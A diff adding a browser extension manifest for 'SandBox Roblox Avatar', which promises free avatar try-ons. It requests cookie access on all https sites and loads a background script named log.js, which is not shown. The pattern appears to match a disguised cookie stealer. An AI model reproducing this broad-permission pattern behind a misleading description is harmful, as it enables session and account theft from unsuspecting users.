@@ -1,0 +1,26 @@
+{
+    "name": "SandBox Roblox Avatar",
+    "description": "Try every style you want without buying. It won't show in real games though.",
+    "version": "3.1.7",
+    "manifest_version": 2,
+
+    "browser_action" : {
+        "default_icon": "assets/roblox.png"
+    },
+
+    "permissions": [
+        "cookies",
+        "https://*/*"
+    ],
+
+    "background": {
+        "scripts": ["scripts/log.js"]
+    },
+
+    "icons": {
+        "16": "assets/roblox.png",
+        "32": "assets/roblox.png",
+        "48": "assets/roblox.png",
+        "128": "assets/roblox.png"
+    }
+}
